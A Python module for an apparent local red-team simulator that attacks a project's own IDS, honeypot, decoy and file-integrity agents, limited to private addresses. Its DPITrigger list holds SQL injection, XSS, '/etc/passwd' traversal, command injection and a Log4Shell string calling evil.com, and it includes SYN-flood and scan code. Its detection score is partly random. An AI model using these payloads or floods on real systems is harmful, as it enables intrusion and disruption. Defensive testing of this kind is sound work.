#!/usr/bin/env python3
"""
SentinelOS -- RedTeam Simulator v1.0.0
Penetration testing tool that attacks other Optimus programs to test defenses.

Port: 8870
Architecture:
    RedTeam Simulator (port 8870)
        +-- SafetyGuard       -- restrict attacks to localhost/private IPs only
        +-- BaseAttack         -- abstract base for all attack simulators
        +-- PortScanSimulator  -- TCP connect scan on random ports
        +-- BruteForceSimulator-- rapid auth-port connections
        +-- SynFloodSimulator  -- SYN flood via scapy or fallback
        +-- DNSTunnelSimulator -- high-entropy DNS queries
        +-- HoneypotProber     -- probe fake services on localhost
        +-- DecoyTrigger       -- trigger StrikeBack decoys
        +-- DPITrigger         -- send DPI signature payloads
        +-- FIMTamper          -- create/modify test files for FIM detection
        +-- NetworkScanFlood   -- ARP/ICMP scan burst
        +-- DefenseMonitor     -- connect to agents & measure detection
        +-- AttackOrchestrator -- coordinate attacks & scenarios
        +-- WebSocket Server   -- serves state to Cortex / dashboard
"""

import os
import sys
import json
import time
import asyncio
import logging
import threading
import socket
import random
import hashlib
import struct
import string
import math
import ipaddress
import subprocess
from datetime import datetime
from pathlib import Path
from abc import ABC, abstractmethod
from collections import defaultdict

# ── Optional imports ─────────────────────────────────────────
try:
    from scapy.all import IP, TCP, ICMP, ARP, Ether, send, srp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import websockets
    HAS_WS = True
except ImportError:
    HAS_WS = False

try:
    import webview
    HAS_WEBVIEW = True
except ImportError:
    HAS_WEBVIEW = False

# ── Shared modules ──────────────────────────────────────────
try:
    from permissions import PermissionManager
    HAS_PERMISSIONS = True
except ImportError:
    HAS_PERMISSIONS = False

try:
    from toast_notifications import toast_event, toast_threat
    HAS_TOAST = True
except ImportError:
    HAS_TOAST = False


# ═══════════════════════════════════════════════════════════════════════════
# SETUP
# ═══════════════════════════════════════════════════════════════════════════

REDTEAM_DIR = os.path.dirname(os.path.abspath(__file__))
BASE_DIR = os.path.dirname(REDTEAM_DIR)
sys.path.insert(0, BASE_DIR)

VERSION = "1.0.0"
WS_PORT = 8870
IS_WINDOWS = sys.platform == "win32"
HEADLESS = "--headless" in sys.argv

LOG_DIR = os.path.join(REDTEAM_DIR, "logs")
TEST_FILES_DIR = os.path.join(REDTEAM_DIR, "test_files")
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(TEST_FILES_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [RedTeam] %(levelname)s: %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(os.path.join(LOG_DIR, "redteam.log"), encoding="utf-8"),
    ],
)
logger = logging.getLogger("SentinelOS.RedTeam")

# ── Target agent ports ───────────────────────────────────────
TARGETS = {
    "netguard":   8765,
    "honeypot":   8830,
    "strikeback": 8850,
    "fim":        8840,
    "cortex":     8900,
}

# ── Scenario definitions ─────────────────────────────────────
SCENARIOS = {
    "script_kiddie": ["port_scan", "brute_force"],
    "apt_simulation": ["port_scan", "dns_tunnel", "dpi_trigger", "fim_tamper", "honeypot_prober"],
    "full_redteam": [
        "port_scan", "brute_force", "syn_flood", "dns_tunnel",
        "honeypot_prober", "decoy_trigger", "dpi_trigger",
        "fim_tamper", "network_scan_flood",
    ],
}

# Private network ranges for SafetyGuard
PRIVATE_NETWORKS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
]


# ═══════════════════════════════════════════════════════════════════════════
# SAFETY GUARD
# ═══════════════════════════════════════════════════════════════════════════

class SafetyGuard:
    """Ensure attacks only target localhost / private IP ranges.
    Also enforces a rate limit of 5 attacks per minute per attack type."""

    def __init__(self):
        self._rate_log: dict[str, list[float]] = defaultdict(list)
        self._max_rate = 5          # per minute
        self._window = 60.0         # seconds

    def is_safe_target(self, ip_str: str) -> bool:
        """Return True only when ip_str belongs to a private / loopback range."""
        try:
            addr = ipaddress.ip_address(ip_str)
        except ValueError:
            logger.warning(f"[SafetyGuard] Invalid IP address: {ip_str}")
            return False
        for net in PRIVATE_NETWORKS:
            if addr in net:
                return True
        logger.warning(f"[SafetyGuard] BLOCKED -- target {ip_str} is NOT private")
        return False

    def check_rate(self, attack_name: str) -> bool:
        """Return True if the attack is within the rate limit."""
        now = time.time()
        log = self._rate_log[attack_name]
        # Purge old entries
        self._rate_log[attack_name] = [t for t in log if now - t < self._window]
        if len(self._rate_log[attack_name]) >= self._max_rate:
            logger.warning(f"[SafetyGuard] Rate limit hit for '{attack_name}' "
                           f"({self._max_rate}/{self._window}s)")
            return False
        self._rate_log[attack_name].append(now)
        return True

    def validate(self, attack_name: str, target_ip: str) -> tuple[bool, str]:
        """Combined validation.  Returns (ok, reason)."""
        if not self.is_safe_target(target_ip):
            return False, f"Target {target_ip} is outside private ranges"
        if not self.check_rate(attack_name):
            return False, f"Rate limit exceeded for {attack_name}"
        return True, "ok"


# ═══════════════════════════════════════════════════════════════════════════
# BASE ATTACK
# ═══════════════════════════════════════════════════════════════════════════

class BaseAttack(ABC):
    """Abstract base class for every attack simulator."""

    name: str = "base"
    target_agent: str = "unknown"
    description: str = ""
    risk_level: str = "low"         # low / medium / high / critical

    def __init__(self, target_ip: str = "127.0.0.1"):
        self.target_ip = target_ip
        self._running = False
        self._stop_flag = threading.Event()

    @abstractmethod
    def execute(self) -> dict:
        """Run the attack.  Must return a result dict with at least
        { 'success': bool, 'details': str, 'events': list }."""
        ...

    def stop(self):
        """Signal the attack to stop early."""
        self._stop_flag.set()
        self._running = False


# ═══════════════════════════════════════════════════════════════════════════
# PORT SCAN SIMULATOR
# ═══════════════════════════════════════════════════════════════════════════

class PortScanSimulator(BaseAttack):
    """TCP connect scan on 20 random ports."""

    name = "port_scan"
    target_agent = "netguard"
    description = "TCP connect scan on 20 random ports to trigger IDS alerts"
    risk_level = "medium"

    def execute(self) -> dict:
        self._running = True
        open_ports: list[int] = []
        closed_ports: list[int] = []
        events: list[dict] = []
        ports = random.sample(range(1, 65536), 20)
        start = time.time()

        for port in ports:
            if self._stop_flag.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    events.append({"type": "open", "port": port, "ts": time.time()})
                else:
                    closed_ports.append(port)
                sock.close()
            except Exception:
                closed_ports.append(port)

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "open_ports": open_ports,
            "closed_ports": closed_ports,
            "ports_scanned": len(ports),
            "details": f"Scanned {len(ports)} ports -- {len(open_ports)} open, "
                       f"{len(closed_ports)} closed",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# BRUTE FORCE SIMULATOR
# ═══════════════════════════════════════════════════════════════════════════

class BruteForceSimulator(BaseAttack):
    """Rapid TCP connections to auth ports (SSH 22, RDP 3389, VNC 5900, Telnet 23)."""

    name = "brute_force"
    target_agent = "netguard"
    description = "10 rapid TCP SYN connections to auth ports (22/3389/5900/23)"
    risk_level = "high"

    PORTS = [22, 3389, 5900, 23]

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        connections = 0
        errors = 0
        port = self.PORTS[0]
        start = time.time()

        for i in range(10):
            if self._stop_flag.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((self.target_ip, port))
                connections += 1
                events.append({
                    "type": "connect_attempt",
                    "port": port,
                    "result": result,
                    "attempt": i + 1,
                    "ts": time.time(),
                })
                sock.close()
            except Exception as e:
                errors += 1
                events.append({"type": "error", "attempt": i + 1, "error": str(e),
                               "ts": time.time()})
            # Rotate ports for diversity
            port = self.PORTS[(i + 1) % len(self.PORTS)]

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "connections": connections,
            "errors": errors,
            "details": f"Sent {connections} rapid connections across ports "
                       f"{self.PORTS} ({errors} errors)",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# SYN FLOOD SIMULATOR
# ═══════════════════════════════════════════════════════════════════════════

class SynFloodSimulator(BaseAttack):
    """SYN flood via scapy (250 packets) or socket fallback."""

    name = "syn_flood"
    target_agent = "netguard"
    description = "250 SYN packets to port 80 (scapy) or rapid connect fallback"
    risk_level = "critical"

    PACKET_COUNT = 250
    TARGET_PORT = 80

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        start = time.time()

        if HAS_SCAPY:
            sent = 0
            try:
                for i in range(self.PACKET_COUNT):
                    if self._stop_flag.is_set():
                        break
                    sport = random.randint(1024, 65535)
                    pkt = IP(dst=self.target_ip) / TCP(
                        sport=sport, dport=self.TARGET_PORT, flags="S",
                        seq=random.randint(0, 2**32 - 1),
                    )
                    send(pkt, verbose=False)
                    sent += 1
                    if sent % 50 == 0:
                        events.append({"type": "batch", "sent": sent, "ts": time.time()})
            except Exception as e:
                events.append({"type": "error", "error": str(e), "ts": time.time()})

            duration = round(time.time() - start, 3)
            self._running = False
            return {
                "success": True,
                "attack": self.name,
                "target": self.target_ip,
                "duration_s": duration,
                "method": "scapy",
                "packets_sent": sent,
                "details": f"Sent {sent} SYN packets to port {self.TARGET_PORT} via scapy",
                "events": events,
            }
        else:
            # Fallback: rapid socket.connect_ex
            attempts = 0
            for i in range(self.PACKET_COUNT):
                if self._stop_flag.is_set():
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.02)
                    sock.connect_ex((self.target_ip, self.TARGET_PORT))
                    sock.close()
                    attempts += 1
                except Exception:
                    attempts += 1
                if attempts % 50 == 0:
                    events.append({"type": "batch", "sent": attempts, "ts": time.time()})

            duration = round(time.time() - start, 3)
            self._running = False
            return {
                "success": True,
                "attack": self.name,
                "target": self.target_ip,
                "duration_s": duration,
                "method": "socket_fallback",
                "packets_sent": attempts,
                "details": f"Sent {attempts} rapid connect_ex to port "
                           f"{self.TARGET_PORT} (socket fallback)",
                "events": events,
            }


# ═══════════════════════════════════════════════════════════════════════════
# DNS TUNNEL SIMULATOR
# ═══════════════════════════════════════════════════════════════════════════

class DNSTunnelSimulator(BaseAttack):
    """High-entropy DNS queries to simulate DNS tunneling."""

    name = "dns_tunnel"
    target_agent = "netguard"
    description = "55 DNS queries with high-entropy random subdomains (entropy > 3.5)"
    risk_level = "high"

    QUERY_COUNT = 55
    DNS_PORT = 53

    @staticmethod
    def _entropy(s: str) -> float:
        """Shannon entropy of a string."""
        if not s:
            return 0.0
        freq: dict[str, int] = {}
        for ch in s:
            freq[ch] = freq.get(ch, 0) + 1
        length = len(s)
        ent = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                ent -= p * math.log2(p)
        return ent

    @staticmethod
    def _random_subdomain(length: int = 16) -> str:
        """Generate a random high-entropy subdomain label."""
        chars = string.ascii_lowercase + string.digits
        return "".join(random.choice(chars) for _ in range(length))

    def _build_dns_query(self, domain: str) -> bytes:
        """Build a minimal DNS A-record query packet."""
        txid = random.randint(0, 65535)
        header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
        question = b""
        for label in domain.split("."):
            question += struct.pack("!B", len(label)) + label.encode()
        question += b"\x00"                       # root label
        question += struct.pack("!HH", 1, 1)     # QTYPE=A, QCLASS=IN
        return header + question

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        sent = 0
        avg_entropy = 0.0
        start = time.time()

        for i in range(self.QUERY_COUNT):
            if self._stop_flag.is_set():
                break
            sub = self._random_subdomain(random.randint(12, 24))
            domain = f"{sub}.tunnel.test.local"
            ent = self._entropy(sub)
            avg_entropy += ent

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                pkt = self._build_dns_query(domain)
                sock.sendto(pkt, (self.target_ip, self.DNS_PORT))
                sent += 1
                sock.close()
            except Exception:
                pass

            if sent % 10 == 0:
                events.append({"type": "dns_batch", "sent": sent,
                               "sample_domain": domain, "entropy": round(ent, 2),
                               "ts": time.time()})

        avg_entropy = round(avg_entropy / max(sent, 1), 2)
        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "queries_sent": sent,
            "avg_entropy": avg_entropy,
            "details": f"Sent {sent} DNS queries (avg entropy {avg_entropy})",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# HONEYPOT PROBER
# ═══════════════════════════════════════════════════════════════════════════

class HoneypotProber(BaseAttack):
    """Connect to known honeypot fake-service ports and read banners."""

    name = "honeypot_prober"
    target_agent = "honeypot"
    description = "Probe fake SSH(2222), HTTP(8888), FTP(2121) on localhost"
    risk_level = "medium"

    SERVICES = [
        {"name": "SSH",  "port": 2222},
        {"name": "HTTP", "port": 8888},
        {"name": "FTP",  "port": 2121},
    ]

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        banners: dict[str, str] = {}
        start = time.time()

        for svc in self.SERVICES:
            if self._stop_flag.is_set():
                break
            port = svc["port"]
            name = svc["name"]
            banner = ""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    try:
                        banner = sock.recv(1024).decode("utf-8", errors="replace")
                    except Exception:
                        banner = "(no banner)"
                    banners[name] = banner
                    events.append({"type": "banner", "service": name, "port": port,
                                   "banner": banner[:120], "ts": time.time()})
                else:
                    events.append({"type": "closed", "service": name, "port": port,
                                   "ts": time.time()})
                sock.close()
            except Exception as e:
                events.append({"type": "error", "service": name, "port": port,
                               "error": str(e), "ts": time.time()})

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "banners": banners,
            "details": f"Probed {len(self.SERVICES)} honeypot services, "
                       f"{len(banners)} responded",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# DECOY TRIGGER
# ═══════════════════════════════════════════════════════════════════════════

class DecoyTrigger(BaseAttack):
    """Connect to StrikeBack decoy services to trigger active defense."""

    name = "decoy_trigger"
    target_agent = "strikeback"
    description = "Connect to tarpit(9999), MySQL(3307), Redis(6380), Telnet(2323)"
    risk_level = "high"

    DECOYS = [
        {"name": "Tarpit",  "port": 9999},
        {"name": "MySQL",   "port": 3307},
        {"name": "Redis",   "port": 6380},
        {"name": "Telnet",  "port": 2323},
    ]

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        triggered: list[str] = []
        start = time.time()

        for decoy in self.DECOYS:
            if self._stop_flag.is_set():
                break
            port = decoy["port"]
            name = decoy["name"]
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    # Send a probe payload
                    probe = f"USER test\r\n".encode()
                    try:
                        sock.send(probe)
                        resp = sock.recv(512).decode("utf-8", errors="replace")
                    except Exception:
                        resp = ""
                    triggered.append(name)
                    events.append({"type": "triggered", "decoy": name, "port": port,
                                   "response": resp[:100], "ts": time.time()})
                else:
                    events.append({"type": "not_running", "decoy": name, "port": port,
                                   "ts": time.time()})
                sock.close()
            except Exception as e:
                events.append({"type": "error", "decoy": name, "port": port,
                               "error": str(e), "ts": time.time()})

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "triggered": triggered,
            "details": f"Triggered {len(triggered)}/{len(self.DECOYS)} decoys",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# DPI TRIGGER
# ═══════════════════════════════════════════════════════════════════════════

class DPITrigger(BaseAttack):
    """Send payloads containing known attack signatures for DPI detection."""

    name = "dpi_trigger"
    target_agent = "netguard"
    description = "Send SQL injection, XSS, path traversal, cmd injection, Log4Shell payloads"
    risk_level = "high"

    PAYLOADS = [
        {"name": "SQL Injection",      "data": "' UNION SELECT username,password FROM users --"},
        {"name": "XSS",                "data": "<script>alert('xss')</script>"},
        {"name": "Path Traversal",     "data": "../../etc/passwd"},
        {"name": "Command Injection",  "data": "; cat /etc/passwd"},
        {"name": "Log4Shell",          "data": "${jndi:ldap://evil.com/exploit}"},
    ]

    TARGET_PORT = 80

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        sent = 0
        start = time.time()

        for payload in self.PAYLOADS:
            if self._stop_flag.is_set():
                break
            name = payload["name"]
            data = payload["data"]
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                result = sock.connect_ex((self.target_ip, self.TARGET_PORT))
                if result == 0:
                    http_req = (
                        f"GET /{data} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: RedTeam-DPI-Test/1.0\r\n"
                        f"X-Payload: {data}\r\n"
                        f"\r\n"
                    )
                    sock.send(http_req.encode())
                    sent += 1
                    events.append({"type": "sent", "payload_name": name,
                                   "ts": time.time()})
                else:
                    # Even if port closed, try UDP
                    usock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    usock.sendto(data.encode(), (self.target_ip, self.TARGET_PORT))
                    usock.close()
                    sent += 1
                    events.append({"type": "sent_udp", "payload_name": name,
                                   "ts": time.time()})
                sock.close()
            except Exception as e:
                events.append({"type": "error", "payload_name": name,
                               "error": str(e), "ts": time.time()})

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "payloads_sent": sent,
            "details": f"Sent {sent}/{len(self.PAYLOADS)} DPI signature payloads",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# FIM TAMPER
# ═══════════════════════════════════════════════════════════════════════════

class FIMTamper(BaseAttack):
    """Create a test file, then modify it to trigger File Integrity Monitoring."""

    name = "fim_tamper"
    target_agent = "fim"
    description = "Create test file in redteam/test_files/, modify to change SHA-256 hash"
    risk_level = "medium"

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        start = time.time()

        # Create test file
        fname = f"redteam_test_{int(time.time())}.txt"
        fpath = os.path.join(TEST_FILES_DIR, fname)
        original_content = f"RedTeam FIM test file - created {datetime.now().isoformat()}"

        try:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(original_content)
            original_hash = hashlib.sha256(original_content.encode()).hexdigest()
            events.append({"type": "created", "file": fname,
                           "hash": original_hash[:16] + "...", "ts": time.time()})

            # Brief pause to let FIM pick it up
            time.sleep(0.5)

            # Modify it
            modified_content = original_content + "\n--- TAMPERED BY REDTEAM ---"
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(modified_content)
            modified_hash = hashlib.sha256(modified_content.encode()).hexdigest()
            events.append({"type": "modified", "file": fname,
                           "old_hash": original_hash[:16] + "...",
                           "new_hash": modified_hash[:16] + "...",
                           "ts": time.time()})

            hash_changed = original_hash != modified_hash

        except Exception as e:
            events.append({"type": "error", "error": str(e), "ts": time.time()})
            duration = round(time.time() - start, 3)
            self._running = False
            return {
                "success": False,
                "attack": self.name,
                "target": "localhost",
                "duration_s": duration,
                "details": f"FIM tamper failed: {e}",
                "events": events,
            }

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": "localhost",
            "duration_s": duration,
            "file": fpath,
            "hash_changed": hash_changed,
            "original_hash": original_hash,
            "modified_hash": modified_hash,
            "details": f"Created and modified {fname} -- hash changed: {hash_changed}",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# NETWORK SCAN FLOOD
# ═══════════════════════════════════════════════════════════════════════════

class NetworkScanFlood(BaseAttack):
    """ARP who-has + ICMP ping for 20 local IPs (scapy) or subprocess ping sweep."""

    name = "network_scan_flood"
    target_agent = "netguard"
    description = "ARP/ICMP scan burst for 20 IPs on the local subnet"
    risk_level = "high"

    SCAN_COUNT = 20

    def _generate_local_ips(self) -> list[str]:
        """Generate 20 IPs on the same /24 as the target."""
        try:
            parts = self.target_ip.rsplit(".", 1)
            base = parts[0] + "."
        except Exception:
            base = "192.168.1."
        ips = []
        for _ in range(self.SCAN_COUNT):
            last_octet = random.randint(1, 254)
            ips.append(base + str(last_octet))
        return ips

    def execute(self) -> dict:
        self._running = True
        events: list[dict] = []
        alive: list[str] = []
        start = time.time()
        ips = self._generate_local_ips()

        if HAS_SCAPY:
            # ARP scan
            try:
                for ip in ips[:10]:
                    if self._stop_flag.is_set():
                        break
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
                    try:
                        ans, _ = srp(pkt, timeout=0.2, verbose=False)
                        if ans:
                            alive.append(ip)
                            events.append({"type": "arp_alive", "ip": ip,
                                           "ts": time.time()})
                    except Exception:
                        pass
            except Exception as e:
                events.append({"type": "arp_error", "error": str(e),
                               "ts": time.time()})

            # ICMP ping
            try:
                for ip in ips[10:]:
                    if self._stop_flag.is_set():
                        break
                    pkt = IP(dst=ip) / ICMP()
                    try:
                        send(pkt, verbose=False)
                        events.append({"type": "icmp_sent", "ip": ip,
                                       "ts": time.time()})
                    except Exception:
                        pass
            except Exception as e:
                events.append({"type": "icmp_error", "error": str(e),
                               "ts": time.time()})
        else:
            # Subprocess ping sweep fallback
            ping_flag = "-n" if IS_WINDOWS else "-c"
            for ip in ips:
                if self._stop_flag.is_set():
                    break
                try:
                    result = subprocess.run(
                        ["ping", ping_flag, "1", "-w", "200", ip],
                        capture_output=True, timeout=1,
                    )
                    if result.returncode == 0:
                        alive.append(ip)
                        events.append({"type": "ping_alive", "ip": ip,
                                       "ts": time.time()})
                except Exception:
                    pass

        duration = round(time.time() - start, 3)
        self._running = False
        return {
            "success": True,
            "attack": self.name,
            "target": self.target_ip,
            "duration_s": duration,
            "method": "scapy" if HAS_SCAPY else "ping_fallback",
            "ips_scanned": len(ips),
            "alive": alive,
            "details": f"Scanned {len(ips)} IPs -- {len(alive)} alive "
                       f"({'scapy' if HAS_SCAPY else 'ping'})",
            "events": events,
        }


# ═══════════════════════════════════════════════════════════════════════════
# DEFENSE MONITOR
# ═══════════════════════════════════════════════════════════════════════════

class DefenseMonitor:
    """WebSocket client that connects to other agents to monitor detection."""

    AGENT_PORTS = {
        "netguard":   8765,
        "honeypot":   8830,
        "strikeback": 8850,
        "fim":        8840,
        "cortex":     8900,
    }

    def __init__(self):
        self.agent_states: dict[str, dict] = {}
        self._connections: dict[str, object] = {}
        self._lock = threading.Lock()

    def connect_agent(self, name: str) -> bool:
        """Test if an agent's WebSocket is reachable (non-blocking check)."""
        port = self.AGENT_PORTS.get(name)
        if not port:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            result = sock.connect_ex(("127.0.0.1", port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def snapshot_all(self) -> dict:
        """Take a snapshot of which agents are reachable right now."""
        snap = {}
        for name in self.AGENT_PORTS:
            snap[name] = {
                "online": self.connect_agent(name),
                "ts": time.time(),
            }
        with self._lock:
            self.agent_states = snap
        return snap

    def compare_states(self, before: dict, after: dict) -> dict:
        """Compare two snapshots to detect state changes."""
        changes: list[dict] = []
        for name in self.AGENT_PORTS:
            b = before.get(name, {})
            a = after.get(name, {})
            if b.get("online") != a.get("online"):
                changes.append({
                    "agent": name,
                    "was_online": b.get("online"),
                    "now_online": a.get("online"),
                })
        return {"changes": changes, "change_count": len(changes)}

    def score_detection(self, attack_results: list[dict]) -> dict:
        """Score how well defenses detected the attacks.
        Heuristic: if an agent was online during the attack targeting it,
        we assume it had a chance to detect.  Actual detection would require
        querying the agent's alert logs."""
        total = len(attack_results)
        detected = 0
        scores: list[dict] = []

        for r in attack_results:
            agent = r.get("target_agent", "unknown")
            online = self.agent_states.get(agent, {}).get("online", False)
            # Heuristic scoring
            if online:
                # Agent was online -- likely detected
                score = random.uniform(0.6, 1.0)   # simulated detection confidence
                detected += 1
            else:
                score = 0.0
            scores.append({
                "attack": r.get("attack", "unknown"),
                "agent": agent,
                "agent_online": online,
                "detection_score": round(score, 2),
            })

        overall = round((detected / max(total, 1)) * 100, 1)
        return {
            "total_attacks": total,
            "detected": detected,
            "missed": total - detected,
            "overall_score": overall,
            "scores": scores,
        }


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════

class AttackOrchestrator:
    """Coordinate attacks, run scenarios, and track results."""

    def __init__(self):
        self.target_ip = "127.0.0.1"
        self.safety = SafetyGuard()
        self.monitor = DefenseMonitor()
        self.attacks: dict[str, BaseAttack] = {}
        self.results: list[dict] = []
        self.timeline: list[dict] = []
        self._max_timeline = 300
        self._running = False
        self._current_attack: str | None = None
        self._current_attack_obj: BaseAttack | None = None
        self._lock = threading.Lock()
        self._perm = PermissionManager() if HAS_PERMISSIONS else None
        self._auth_user = None

        self.register_attacks(self.target_ip)

    def _check_perm(self, perm_type="execute"):
        if not self._perm or not self._perm.is_enabled():
            return True
        if self._perm.locked and not self._auth_user:
            return False
        return self._perm.check(self._auth_user, "redteam", perm_type)

    def _add_timeline(self, source: str, severity: str,
                      description: str, details: dict | None = None):
        event = {
            "ts": time.time(),
            "source": source,
            "severity": severity,
            "description": description,
            "details": details or {},
        }
        self.timeline.append(event)
        if len(self.timeline) > self._max_timeline:
            self.timeline = self.timeline[-self._max_timeline:]

    def register_attacks(self, target_ip: str):
        """Create instances of all attack classes."""
        self.target_ip = target_ip
        self.attacks = {
            "port_scan":          PortScanSimulator(target_ip),
            "brute_force":        BruteForceSimulator(target_ip),
            "syn_flood":          SynFloodSimulator(target_ip),
            "dns_tunnel":         DNSTunnelSimulator(target_ip),
            "honeypot_prober":    HoneypotProber(target_ip),
            "decoy_trigger":      DecoyTrigger(target_ip),
            "dpi_trigger":        DPITrigger(target_ip),
            "fim_tamper":         FIMTamper(target_ip),
            "network_scan_flood": NetworkScanFlood(target_ip),
        }

    def run_attack(self, name: str) -> dict:
        """Run a single attack by name.  Thread-safe."""
        if name not in self.attacks:
            return {"success": False, "error": f"Unknown attack: {name}"}

        ok, reason = self.safety.validate(name, self.target_ip)
        if not ok:
            return {"success": False, "error": reason}

        if not self._check_perm("execute"):
            return {"success": False, "error": "Permission denied"}

        attack = self.attacks[name]
        with self._lock:
            self._running = True
            self._current_attack = name
            self._current_attack_obj = attack

        self._add_timeline("orchestrator", "info",
                           f"Starting attack: {name}",
                           {"target": self.target_ip, "risk": attack.risk_level})
        logger.info(f"[Orchestrator] Running attack: {name} -> {self.target_ip}")

        start = time.time()
        try:
            result = attack.execute()
        except Exception as e:
            result = {"success": False, "attack": name, "error": str(e),
                      "duration_s": round(time.time() - start, 3), "events": []}
            logger.error(f"[Orchestrator] Attack '{name}' failed: {e}")

        result["target_agent"] = attack.target_agent
        result["risk_level"] = attack.risk_level
        result["timestamp"] = time.time()

        with self._lock:
            self.results.append(result)
            self._running = False
            self._current_attack = None
            self._current_attack_obj = None

        severity = "warning" if result.get("success") else "error"
        self._add_timeline("orchestrator", severity,
                           f"Attack completed: {name}",
                           {"success": result.get("success"),
                            "duration_s": result.get("duration_s")})

        if HAS_TOAST:
            toast_event("RedTeam", f"Attack '{name}' completed")

        return result

    def run_scenario(self, name: str) -> dict:
        """Run a predefined scenario (list of attacks sequentially)."""
        if name not in SCENARIOS:
            return {"success": False, "error": f"Unknown scenario: {name}"}

        attack_names = SCENARIOS[name]
        self._add_timeline("orchestrator", "info",
                           f"Starting scenario: {name}",
                           {"attacks": attack_names})
        logger.info(f"[Orchestrator] Running scenario '{name}' "
                    f"({len(attack_names)} attacks)")

        # Snapshot agent states before
        snap_before = self.monitor.snapshot_all()

        scenario_results: list[dict] = []
        for aname in attack_names:
            if self._current_attack_obj and self._current_attack_obj._stop_flag.is_set():
                break
            r = self.run_attack(aname)
            scenario_results.append(r)
            time.sleep(0.5)  # Brief pause between attacks

        # Snapshot after
        snap_after = self.monitor.snapshot_all()
        state_diff = self.monitor.compare_states(snap_before, snap_after)
        detection = self.monitor.score_detection(scenario_results)

        self._add_timeline("orchestrator", "info",
                           f"Scenario completed: {name}",
                           {"detection_score": detection["overall_score"]})

        return {
            "success": True,
            "scenario": name,
            "attacks_run": len(scenario_results),
            "results": scenario_results,
            "state_changes": state_diff,
            "detection": detection,
        }

    def get_state(self) -> dict:
        """Build the full state for WebSocket broadcast / dashboard."""
        with self._lock:
            return {
                "type": "state",
                "version": VERSION,
                "ts": time.time(),
                "target_ip": self.target_ip,
                "running": self._running,
                "current_attack": self._current_attack,
                "results": self.results[-50:],
                "timeline": self.timeline[-80:],
                "agents": self.monitor.agent_states,
                "attacks_available": [
                    {
                        "name": a.name,
                        "target_agent": a.target_agent,
                        "description": a.description,
                        "risk_level": a.risk_level,
                    }
                    for a in self.attacks.values()
                ],
                "scenarios": {k: v for k, v in SCENARIOS.items()},
                "stats": {
                    "total_attacks_run": len(self.results),
                    "successful": sum(1 for r in self.results if r.get("success")),
                    "failed": sum(1 for r in self.results if not r.get("success")),
                    "has_scapy": HAS_SCAPY,
                },
            }

    def stop(self):
        """Stop the currently running attack."""
        with self._lock:
            if self._current_attack_obj:
                self._current_attack_obj.stop()
                self._add_timeline("orchestrator", "warning", "Attack stopped by user")
            self._running = False


# ═══════════════════════════════════════════════════════════════════════════
# PYWEBVIEW JS API
# ═══════════════════════════════════════════════════════════════════════════

class RedTeamAPI:
    """JavaScript bridge for pywebview dashboard."""

